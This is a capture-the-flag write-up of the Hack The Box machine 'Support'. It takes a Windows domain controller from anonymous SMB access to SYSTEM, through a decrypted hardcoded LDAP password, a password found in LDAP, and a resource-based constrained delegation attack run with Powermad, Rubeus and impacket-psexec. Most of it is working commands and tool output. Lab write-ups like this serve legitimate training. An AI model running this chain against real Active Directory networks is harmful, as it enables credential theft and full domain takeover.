---
layout: post
title: Support
date: 2025-05-23 23:15:00 +0100
categories: [Walkthroughs]
tags: [htb, windows, active directory, privesc]
---
![alt text](https://labs.hackthebox.com/storage/avatars/833a3b1f7f96b5708d19b6de084c3201.png)

---

| Description    |  Info |
| --------- | ----------- |
| Platform    | Hack The box       |
| OS | Windows        |
| Difficulty | Easy        |
| Release Date | 30 Jul 2022        |

# Highlights
SMB enumeration, Python Scripting, dnSpy, Rubeus, Bloodhound

---

# Open ports enumeration
Lets start by starting an nmap scan

```bash
nmap -T4 -p- -A 10.10.11.174 > nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 11:42 GMT
Nmap scan report for 10.10.11.174
Host is up (0.11s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-15 11:45:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
```

Nmap returns the name of the fully qualified domain name ```support.htb```, as well as port ```88```, being kerberos, we know this is a domain controller, so lets add the IP address 10.10.11.174 to our ```/etc/hosts/``` file since we do not havd DNS resolution on CTFs.

A few ports are open, but I like to start my domain controllers enumeration from ```SMB```
# SMB Enumeration
```bash
ssmbclient -L \\\\support.htb\\ 
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to support.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
We are able to enumerate the SMB shares anonymously, we find mostly default shares, apart from ```support-tools```, so lets have a look and see if we have access to read the files contained in the share

```bash 
smbclient \\\\support.htb\\support-tools
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 18:01:06 2022
  ..                                  D        0  Sat May 28 12:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 12:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 12:19:55 2022
  putty.exe                           A  1273576  Sat May 28 12:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 12:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 18:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 12:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 12:19:43 2022

                4026367 blocks of size 4096. 968211 blocks available
smb: \> 
```
We can not only enumerate shares anonymously, but also access support-tools. We find some executables, most of them can be downloaded publicly, but the one called ```UserInfo.exe.zip```, so lets download it and move it to a windows VM.

# Analyzing UserInfo.exe.zip
```bash
smb: \> mget UserInfo.exe.zip
Get file UserInfo.exe.zip? yes
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (265.7 KiloBytes/sec) (average 265.7 KiloBytes/sec)
smb: \> 
```
We download the file using the command ```mget```, and personally Im going to move it to a Windows VM using a shared folder between my Kali Machine and the Windows VM.
Once unzipped, we find an .EXE file, so lets open dnSpy and start dissecting this executable.
dnSpy can be downloaded [https://github.com/dnSpy/dnSpy](https://github.com/dnSpy/dnSpy), this tool is a debugger and assembly editor that can be used without the source code.

Very quickly, we find 3 interesting components:
* enc_password
* key
* LdapQuery


```enc_password``` contains:


An encoded password

```key``` contains:


The key to decode the password

```LdapQuery``` contains:


A valid user, called ldap



Looks like the string we found in enc_password is encoded with the key found which is ```armando```, and possibly used by the user ldap.

This being a strangely short key, we are going to our AI friend of choice what can we do with the string and the key we found, and ChatGPT returns with a nice python script that can decrypt the password for us

```bash
import base64
# Given values
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando"

# Step 1: Base64 decode the enc_password
encoded_bytes = base64.b64decode(enc_password)

# Step 2: XOR decryption using the key and constant 223
decrypted_bytes = bytearray(len(encoded_bytes))

for i in range(len(encoded_bytes)):
    decrypted_bytes[i] = encoded_bytes[i] ^ ord(key[i % len(key)]) ^ 223

# Step 3: Convert the result back to string using ASCII (or default encoding)
decrypted_password = decrypted_bytes.decode('ascii')

print(f"Decrypted password: {decrypted_password}")
```

Now we unleash our shiny new script 
```bash
python3 decrypt.py
Decrypted password: nvEfEK16^1aM4$**********
```
# Foothold
Lets try the password we have found with ```netexec``` to confirm the password works with our ```ldap``` user.

```bash
netexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7********************'    
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7********************
```
It works, so we proceed to user enumeration

```bash
netexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7********************' --users
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7******************** 
SMB         10.10.11.174    445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                               
SMB         10.10.11.174    445    DC               Administrator                 2022-07-19 17:55:56 0       Built-in account for administering the computer/domain                                                                                                                                                
SMB         10.10.11.174    445    DC               Guest                         2022-05-28 11:18:55 0       Built-in account for guest access to the computer/domain                                                                                                                                              
SMB         10.10.11.174    445    DC               krbtgt                        2022-05-28 11:03:43 0       Key Distribution Center Service Account 
SMB         10.10.11.174    445    DC               ldap                          2022-05-28 11:11:46 0        
SMB         10.10.11.174    445    DC               support                       2022-05-28 11:12:00 0        
SMB         10.10.11.174    445    DC               smith.rosario                 2022-05-28 11:12:19 0        
SMB         10.10.11.174    445    DC               hernandez.stanley             2022-05-28 11:12:34 0        
SMB         10.10.11.174    445    DC               wilson.shelby                 2022-05-28 11:12:50 0        
SMB         10.10.11.174    445    DC               anderson.damian               2022-05-28 11:13:05 0        
SMB         10.10.11.174    445    DC               thomas.raphael                2022-05-28 11:13:21 0        
SMB         10.10.11.174    445    DC               levine.leopoldo               2022-05-28 11:13:37 0        
SMB         10.10.11.174    445    DC               raven.clifton                 2022-05-28 11:13:53 0        
SMB         10.10.11.174    445    DC               bardot.mary                   2022-05-28 11:14:08 0        
SMB         10.10.11.174    445    DC               cromwell.gerard               2022-05-28 11:14:24 0        
SMB         10.10.11.174    445    DC               monroe.david                  2022-05-28 11:14:39 0        
SMB         10.10.11.174    445    DC               west.laura                    2022-05-28 11:14:55 0        
SMB         10.10.11.174    445    DC               langley.lucy                  2022-05-28 11:15:10 0        
SMB         10.10.11.174    445    DC               daughtler.mabel               2022-05-28 11:15:26 0        
SMB         10.10.11.174    445    DC               stoll.rachelle                2022-05-28 11:15:42 0        
SMB         10.10.11.174    445    DC               ford.victoria                 2022-05-28 11:15:58 0        
SMB         10.10.11.174    445    DC               [*] Enumerated 20 local users: SUPPORT
```

In CTFs as in the real world, password reuse is very common, so we create a ```users.txt``` file and we use netexec to attempt password spraying, unfortunately without success.

Since the user is called ldap, and the executable is executing a ldap query with the password we found, we can try enumerating ldap to see if we find any hiddin passwords or clues.
```bash
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7********************' -b 'dc=support,dc=htb' > ldapsearch.txt
```
Examining the ```ldapsearch.txt``` that contains the results, we find an interesting string with the name of ```info``` that seems to containg what looks like a password for the user ```support```
```bash
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Iron*************************
```

Looking back at the ```nmap``` scan, we see that port ```5985```which is used for windows remote management is open, so we attempt to login with the new potential password we found.
```bash
 evil-winrm -i 10.10.11.174 -u support -p 'Iron*************************' 

*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
*Evil-WinRM* PS C:\Users\support\Documents> hostname
dc
*Evil-WinRM* PS C:\Users\support\Documents> dir C:\Users\support\Desktop


    Directory: C:\Users\support\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         5/24/2025   3:18 AM             34 user.txt
```
And we are in, we can now grab the user flag with the command ```type user.txt```

Since we are against a domain controller, and have a valid user, we can use ```bloodhound``` to enumerate the domain further.

For a complete guide on how to setup bloodhound, there is a great video byTyler Ramsbey [here](https://www.youtube.com/watch?v=RhdhLwZHZmU&t=431s).

Once neo4j and bloodhound are running, we use the ad-bloodhound.sh to enumerate the domain and upload the files to bloodhound.
```bash
./ad-bloodhound.sh                                                    
Domain: 
support.htb
Username: 
support
Password: 
Iron*************************
IP of Domain: 
10.10.11.174
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Management.support.htb
INFO: Querying computer: dc.support.htb
INFO: Done in 00M 15S
```
# Privilege Escalation
From bloodhound, we can see that the user ```support``` is part of the ```SHARED SUPPORT ACCOUNTS``` which has GenericAll permissions on ```DC.SUPPORT.HTB```. That means we can own the domain controller using a tool like Rubeus, using a powershell session with the user ```support``` which we already have as we were able to login using ```evil-winrm```.


```bash
*Evil-WinRM* PS C:\Users\support\Documents> cd C:\
*Evil-WinRM* PS C:\> mkdir temp


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/24/2025   5:09 AM                temp


*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> upload Rubeus.exe
                                        
Info: Uploading /home/kali/HTB/Support/Rubeus.exe to C:\temp\Rubeus.exe
                                        
Data: 595968 bytes of 595968 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\temp> upload Powermad.ps1
                                        
Info: Uploading /home/kali/HTB/Support/Powermad.ps1 to C:\temp\Powermad.ps1
                                        
Data: 180768 bytes of 180768 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\temp> . .\Powermad.ps1
```
We create a temp directory in C:\ so we have all RWX (right,write,execute) rights.
We upload Rubeus.exe and Powermad.ps1
For further information on Powermad.ps1 visit [https://offsec.tools/tool/powermad](https://offsec.tools/tool/powermad).

Now we just follow the instructions found with bloodhound to execute the exploit and take over the DC.

* Step 1 (add-machine)

```bash
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
[+] Machine account FAKE-COMP01 added

```
* Step 2 (check if the machine has been created)

```bash
Get-ADComputer -identity FAKE-COMP01

DistinguishedName : CN=FAKE-COMP01,CN=Computers,DC=support,DC=htb
DNSHostName       : FAKE-COMP01.support.htb
Enabled           : True
Name              : FAKE-COMP01
ObjectClass       : computer
ObjectGUID        : 41388f07-9e13-4fe2-a4aa-76fce5e9d1b0
SamAccountName    : FAKE-COMP01$
SID               : S-1-5-21-1677581083-3380853377-188903654-5601
UserPrincipalName :
```

* Step 3 (grant the DC permission to delegate the fake machine)

```bash
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

* Step 4 (confirm step 3 worked)

```bash
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount


DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb
DNSHostName                          : dc.support.htb
Enabled                              : True
Name                                 : DC
ObjectClass                          : computer
ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127
PrincipalsAllowedToDelegateToAccount : {CN=FAKE-COMP01,CN=Computers,DC=support,DC=htb}
SamAccountName                       : DC$
SID                                  : S-1-5-21-1677581083-3380853377-188903654-1000
UserPrincipalName                    :
```
* Step 5 (generate an NTLM hash given a password for the fake machine)

```bash
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : Password123
[*] Input username             : FAKE-COMP01$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostfake-comp01.support.htb
[*]       rc4_hmac             : 58A478135A93AC3BF058A5EA0E8FDB71
[*]       aes128_cts_hmac_sha1 : 06C1EABAD3A21C24DF384247BC85C540
[*]       aes256_cts_hmac_sha1 : FF7BA224B544AA97002B2BEE94EADBA7855EF81A1E05B7EB33D4BCD55807FF53
[*]       des_cbc_md5          : 5B045E854358687C
```
* Step 6 S4U(Service For User) attack to impersonate the Administrato user using the fake machine account

```bash
../Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using rc4_hmac hash: 58A478135A93AC3BF058A5EA0E8FDB71
[*] Building AS-REQ (w/ preauth) for: 'support.htb\FAKE-COMP01$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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


[*] Action: S4U

[*] Building S4U2self request for: 'FAKE-COMP01$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'FAKE-COMP01$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      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
      MA4bDEZBS0UtQ09NUDAxJA==

[*] Impersonating user 'Administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      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
      MBYbBGNpZnMbDmRjLnN1cHBvcnQuaHRi
[+] Ticket successfully imported!
```
* Step 7 

(copy the base64 ticket.kirbi in a txt file on the attack machine and save it as ticket.kirbi.b64, then run the command ``` base64 -d ticket.kirbi.b64 > ticket.kirbi``` to decode to plaintext)

* Step 8 (use impacket-ticketCoverter to convert ```ticket.kirbi``` to ```ticket.ccache``` so it can be used by our linux tools)

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache                                                       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```
* Step 9 (define the ccache ticket that will be used for the kerberos tools)

```bash
export KRB5CCNAME=ticket.ccache
```

* Step 10 (own the domain controller with impacket-psexec)

```bash
impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file zmKhZNkE.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service iVUj on dc.support.htb.....
[*] Starting service iVUj.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
dc

C:\Windows\system32> dir C:\Users\Administrator\Desktop 
 Volume in drive C has no label.
 Volume Serial Number is 955A-5CBB

 Directory of C:\Users\Administrator\Desktop

05/28/2022  04:17 AM    <DIR>          .
05/28/2022  04:11 AM    <DIR>          ..
05/24/2025  03:18 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,970,781,184 bytes free
```
Don't forget to collect your root.txt!